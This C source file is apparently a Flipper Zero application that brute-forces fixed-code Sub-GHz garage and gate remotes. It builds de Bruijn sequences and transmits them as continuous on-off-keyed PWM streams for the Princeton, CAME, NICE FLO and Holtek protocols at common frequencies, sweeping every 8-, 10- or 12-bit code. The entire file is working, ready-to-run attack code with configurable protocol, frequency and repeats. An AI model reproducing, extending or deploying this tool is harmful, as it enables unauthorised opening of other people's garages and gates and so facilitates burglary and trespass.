/**
 * De Bruijn brute-forcer (OpenSesame-style) for fixed-code Sub-GHz remotes.
 *
 * A naive brute force sends every N-bit code separately (code + preamble/gap),
 * costing ~N*2^N symbols. A de Bruijn sequence B(2,N) is a cyclic bitstream in
 * which every N-bit window appears exactly once, so transmitting it as one
 * continuous stream of PWM symbols makes a receiver's sliding N-bit decoder see
 * EVERY possible code as the stream slides past — covering all 2^N codes in only
 * 2^N + N-1 symbols (no per-code preamble/gap). ~N x faster.
 *
 * Only works on receivers that decode a free-running symbol stream without a
 * hard inter-code sync/gap requirement (classic fixed-code garages/gates:
 * PT2262/Princeton, CAME, NICE FLO, Holtek-style PWM). Rolling-code fobs are
 * immune (not a fixed code space).
 *
 * TX runs on a worker thread via the shared subghz_devices async-TX path (OOK),
 * so the UI stays live and Back cancels mid-sweep.
 */
#include <furi.h>
#include <furi_hal_power.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/popup.h>
#include <toolbox/level_duration.h>

#include <lib/subghz/devices/devices.h>
#include <lib/subghz/devices/preset.h>

#define TAG "SubGhzDeBruijn"

/* ---- config tables ---- */

// Binary PWM symbol shapes, in multiples of the base element time `te`.
// bit 0 => high h0*te, low l0*te ;  bit 1 => high h1*te, low l1*te.
typedef struct {
    const char* name;
    uint32_t te; // base element time, microseconds
    uint8_t h0, l0, h1, l1;
} DbProto;

static const DbProto DB_PROTOS[] = {
    {"Princeton", 350, 1, 3, 3, 1}, // PT2262/2260 family
    {"CAME", 320, 1, 2, 2, 1},
    {"NICE FLO", 700, 1, 2, 2, 1},
    {"Holtek", 430, 1, 2, 2, 1}, // HT12E-style
};
#define DB_PROTO_COUNT (sizeof(DB_PROTOS) / sizeof(DB_PROTOS[0]))

static const uint8_t DB_BITS[] = {8, 10, 12}; // code length N (de Bruijn order)
#define DB_BITS_COUNT (sizeof(DB_BITS) / sizeof(DB_BITS[0]))

static const uint32_t DB_FREQS[] = {433920000, 315000000, 868350000, 434420000, 434790000};
static const char* const DB_FREQ_NAMES[] = {"433.92", "315.00", "868.35", "434.42", "434.79"};
#define DB_FREQ_COUNT (sizeof(DB_FREQS) / sizeof(DB_FREQS[0]))

#define DB_REPEATS_MAX 5

typedef enum {
    DbViewConfig,
    DbViewPopup,
} DbView;

typedef enum {
    DbCustomEventTxDone = 100,
} DbCustomEvent;

/* ---- async-TX walker state (read from ISR/timer context) ---- */
typedef struct {
    const uint8_t* seq; // de Bruijn bits (0/1), incl. N-1 wrap bits appended
    size_t len; // total bits to emit per pass
    volatile size_t idx; // current bit
    uint8_t phase; // 0 = emit high half, 1 = emit low half
    uint8_t rep; // current pass
    uint8_t reps; // total passes
    uint32_t te;
    uint8_t h0, l0, h1, l1;
    volatile bool cancel;
} DbTx;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    VariableItemList* list;
    Popup* popup;

    // config
    uint8_t proto_idx;
    uint8_t bits_idx;
    uint8_t freq_idx;
    uint8_t reps_idx; // 0-based => reps = reps_idx + 1

    // tx
    FuriThread* worker;
    DbTx tx;
    bool tx_active;
    char popup_text[96]; // persists — popup stores the pointer
} DbApp;

/* ---- de Bruijn generation (Fredricksen-Kessler-Maiorana / prefer-low) ---- */
// Fills out[] with B(2,n): 2^n bits where every n-bit window is unique.
typedef struct {
    uint8_t* out;
    size_t len;
    uint8_t a[24]; // 1-indexed working array; n <= ~16
    uint8_t n;
} DbGen;

static void db_fkm(DbGen* g, uint8_t t, uint8_t p) {
    if(t > g->n) {
        if(g->n % p == 0) {
            for(uint8_t i = 1; i <= p; i++) g->out[g->len++] = g->a[i];
        }
        return;
    }
    g->a[t] = g->a[t - p];
    db_fkm(g, t + 1, p);
    for(uint8_t j = g->a[t - p] + 1; j < 2; j++) { // k = 2
        g->a[t] = j;
        db_fkm(g, t + 1, t);
    }
}

// Generate B(2,n) into out (must hold 2^n + (n-1) bytes). Returns emit length.
static size_t db_generate(uint8_t n, uint8_t* out) {
    DbGen g = {.out = out, .len = 0, .n = n};
    memset(g.a, 0, sizeof(g.a));
    db_fkm(&g, 1, 1); // fills exactly 2^n bits
    size_t base = g.len; // == 2^n
    // append first n-1 bits so the sliding window also covers the wrap-around
    for(uint8_t i = 0; i < n - 1; i++) out[base + i] = out[i];
    return base + (n - 1);
}

/* ---- async-TX yield (ISR/timer context: no malloc, no log, no locks) ---- */
static LevelDuration db_yield(void* ctx) {
    DbTx* t = ctx;
    if(t->cancel || t->rep >= t->reps) return level_duration_reset();

    uint8_t bit = t->seq[t->idx];
    LevelDuration ld;
    if(t->phase == 0) {
        ld = level_duration_make(true, (uint32_t)t->te * (bit ? t->h1 : t->h0));
        t->phase = 1;
    } else {
        ld = level_duration_make(false, (uint32_t)t->te * (bit ? t->l1 : t->l0));
        t->phase = 0;
        if(++t->idx >= t->len) {
            t->idx = 0;
            t->rep++;
        }
    }
    return ld;
}

/* ---- worker: generate + drive the radio, then post TxDone ---- */
static int32_t db_worker(void* context) {
    DbApp* app = context;
    const DbProto* p = &DB_PROTOS[app->proto_idx];
    uint8_t n = DB_BITS[app->bits_idx];
    uint32_t freq = DB_FREQS[app->freq_idx];

    size_t base = (size_t)1u << n;
    size_t total = base + (n - 1);
    uint8_t* seq = malloc(total);
    if(!seq) {
        view_dispatcher_send_custom_event(app->view_dispatcher, DbCustomEventTxDone);
        return 0;
    }
    db_generate(n, seq);

    app->tx.seq = seq;
    app->tx.len = total;
    app->tx.idx = 0;
    app->tx.phase = 0;
    app->tx.rep = 0;
    app->tx.reps = app->reps_idx + 1;
    app->tx.te = p->te;
    app->tx.h0 = p->h0;
    app->tx.l0 = p->l0;
    app->tx.h1 = p->h1;
    app->tx.l1 = p->l1;
    // app->tx.cancel is managed by the input callback

    subghz_devices_init();
    uint8_t att = 0;
    while(!furi_hal_power_is_otg_enabled() && att++ < 5) {
        furi_hal_power_enable_otg();
        furi_delay_ms(10);
    }
    const SubGhzDevice* device = subghz_devices_get_by_name("cc1101_ext");
    if(!device) device = subghz_devices_get_by_name("cc1101_int");

    if(device) {
        subghz_devices_begin(device);
        subghz_devices_reset(device);
        subghz_devices_idle(device);
        subghz_devices_load_preset(device, FuriHalSubGhzPresetOok650Async, NULL);
        subghz_devices_set_frequency(device, freq);
        if(subghz_devices_set_tx(device)) {
            subghz_devices_start_async_tx(device, db_yield, &app->tx);
            // wait until the walker finished all passes (or Back set cancel)
            uint32_t guard = 0;
            while(!subghz_devices_is_async_complete_tx(device) && guard++ < 12000) {
                furi_delay_ms(10);
            }
            subghz_devices_stop_async_tx(device);
        }
        subghz_devices_idle(device);
        subghz_devices_sleep(device);
        subghz_devices_end(device);
    }
    if(furi_hal_power_is_otg_enabled()) furi_hal_power_disable_otg();
    subghz_devices_deinit();

    free(seq);
    app->tx.seq = NULL;
    view_dispatcher_send_custom_event(app->view_dispatcher, DbCustomEventTxDone);
    return 0;
}

/* ---- UI helpers ---- */
static void db_update_item_texts(DbApp* app) {
    // rebuild the four value labels from config
    // (values are set individually in change callbacks; nothing global needed)
    UNUSED(app);
}

static void db_start_tx(DbApp* app) {
    if(app->tx_active) return;
    const DbProto* p = &DB_PROTOS[app->proto_idx];
    uint8_t n = DB_BITS[app->bits_idx];
    snprintf(
        app->popup_text,
        sizeof(app->popup_text),
        "%s  %u-bit\n%s MHz  x%u\n%lu codes\nBack = stop",
        p->name,
        (unsigned)n,
        DB_FREQ_NAMES[app->freq_idx],
        (unsigned)(app->reps_idx + 1),
        (unsigned long)(1u << n));
    popup_reset(app->popup);
    popup_set_header(app->popup, "De Bruijn TX", 64, 6, AlignCenter, AlignTop);
    popup_set_text(app->popup, app->popup_text, 64, 26, AlignCenter, AlignTop);

    app->tx.cancel = false;
    app->tx_active = true;
    view_dispatcher_switch_to_view(app->view_dispatcher, DbViewPopup);

    app->worker = furi_thread_alloc_ex("DbTx", 4096, db_worker, app);
    furi_thread_start(app->worker);
}

// OK on the "Transmit" row
static void db_list_enter_callback(void* context, uint32_t index) {
    DbApp* app = context;
    if(index == 4) db_start_tx(app); // last row = Transmit
}

static void db_proto_changed(VariableItem* item) {
    DbApp* app = variable_item_get_context(item);
    app->proto_idx = variable_item_get_current_value_index(item);
    variable_item_set_current_value_text(item, DB_PROTOS[app->proto_idx].name);
}
static void db_bits_changed(VariableItem* item) {
    DbApp* app = variable_item_get_context(item);
    app->bits_idx = variable_item_get_current_value_index(item);
    char b[8];
    snprintf(b, sizeof(b), "%u", (unsigned)DB_BITS[app->bits_idx]);
    variable_item_set_current_value_text(item, b);
}
static void db_freq_changed(VariableItem* item) {
    DbApp* app = variable_item_get_context(item);
    app->freq_idx = variable_item_get_current_value_index(item);
    variable_item_set_current_value_text(item, DB_FREQ_NAMES[app->freq_idx]);
}
static void db_reps_changed(VariableItem* item) {
    DbApp* app = variable_item_get_context(item);
    app->reps_idx = variable_item_get_current_value_index(item);
    char b[8];
    snprintf(b, sizeof(b), "%u", (unsigned)(app->reps_idx + 1));
    variable_item_set_current_value_text(item, b);
}

// Popup input: Back cancels the sweep (worker sees tx.cancel and stops).
static bool db_popup_input_callback(InputEvent* event, void* context) {
    DbApp* app = context;
    if(event->type == InputTypeShort && event->key == InputKeyBack) {
        app->tx.cancel = true; // let the worker unwind + post TxDone
        return true;
    }
    return false;
}

static bool db_custom_event_callback(void* context, uint32_t event) {
    DbApp* app = context;
    if(event == DbCustomEventTxDone) {
        if(app->worker) {
            furi_thread_join(app->worker);
            furi_thread_free(app->worker);
            app->worker = NULL;
        }
        app->tx_active = false;
        view_dispatcher_switch_to_view(app->view_dispatcher, DbViewConfig);
        return true;
    }
    return false;
}

static bool db_nav_callback(void* context) {
    DbApp* app = context;
    // On the config screen, Back exits the app. (Popup Back is intercepted by its
    // own input callback while a TX is active.)
    if(app->tx_active) {
        app->tx.cancel = true;
        return true; // swallow — TxDone will return us to config
    }
    view_dispatcher_stop(app->view_dispatcher);
    return true;
}

/* ---- alloc / free ---- */
static DbApp* db_app_alloc(void) {
    DbApp* app = malloc(sizeof(DbApp));
    memset(app, 0, sizeof(DbApp));

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, db_custom_event_callback);
    view_dispatcher_set_navigation_event_callback(app->view_dispatcher, db_nav_callback);

    app->list = variable_item_list_alloc();
    VariableItem* it;
    it = variable_item_list_add(app->list, "Protocol", DB_PROTO_COUNT, db_proto_changed, app);
    variable_item_set_current_value_index(it, 0);
    variable_item_set_current_value_text(it, DB_PROTOS[0].name);

    it = variable_item_list_add(app->list, "Bits (N)", DB_BITS_COUNT, db_bits_changed, app);
    variable_item_set_current_value_index(it, DB_BITS_COUNT - 1); // default 12
    app->bits_idx = DB_BITS_COUNT - 1;
    {
        char b[8];
        snprintf(b, sizeof(b), "%u", (unsigned)DB_BITS[app->bits_idx]);
        variable_item_set_current_value_text(it, b);
    }

    it = variable_item_list_add(app->list, "Frequency", DB_FREQ_COUNT, db_freq_changed, app);
    variable_item_set_current_value_index(it, 0);
    variable_item_set_current_value_text(it, DB_FREQ_NAMES[0]);

    it = variable_item_list_add(app->list, "Repeats", DB_REPEATS_MAX, db_reps_changed, app);
    variable_item_set_current_value_index(it, 0);
    variable_item_set_current_value_text(it, "1");

    variable_item_list_add(app->list, "Transmit", 0, NULL, app); // row index 4
    variable_item_list_set_enter_callback(app->list, db_list_enter_callback, app);

    view_dispatcher_add_view(
        app->view_dispatcher, DbViewConfig, variable_item_list_get_view(app->list));

    app->popup = popup_alloc();
    view_set_previous_callback(popup_get_view(app->popup), NULL);
    view_set_input_callback(popup_get_view(app->popup), db_popup_input_callback);
    view_set_context(popup_get_view(app->popup), app);
    view_dispatcher_add_view(app->view_dispatcher, DbViewPopup, popup_get_view(app->popup));

    db_update_item_texts(app);
    return app;
}

static void db_app_free(DbApp* app) {
    if(app->worker) {
        app->tx.cancel = true;
        furi_thread_join(app->worker);
        furi_thread_free(app->worker);
    }
    view_dispatcher_remove_view(app->view_dispatcher, DbViewConfig);
    view_dispatcher_remove_view(app->view_dispatcher, DbViewPopup);
    variable_item_list_free(app->list);
    popup_free(app->popup);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);
}

int32_t subghz_debruijn_app(void* p) {
    UNUSED(p);
    DbApp* app = db_app_alloc();
    view_dispatcher_switch_to_view(app->view_dispatcher, DbViewConfig);
    view_dispatcher_run(app->view_dispatcher);
    db_app_free(app);
    return 0;
}
